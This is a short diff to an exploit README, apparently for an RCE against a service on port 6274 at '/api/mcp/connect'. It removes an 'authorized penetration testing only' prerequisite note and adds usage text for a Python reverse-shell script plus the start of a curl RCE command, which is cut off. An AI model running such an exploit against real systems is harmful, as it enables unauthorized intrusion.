@@ -12,13 +12,12 @@
 
 ## Exploit
 
-### Prerequisites
+Python3 script that sets up a listener and gets a reverse shell back.
 
-- Python 3.x with `requests` library, or simply `curl`
-- Network access to the target on port `6274` (default)
-- **Authorized penetration testing only** — ensure explicit written permission
-
-### One-liner (curl)
+Usage:
+    python3 exploit.py <target_ip> <your_ip> <your_port>
+    
+### You can use also get RCE using (curl):
 
 ```bash
 curl -s http://<TARGET_IP>:6274/api/mcp/connect \
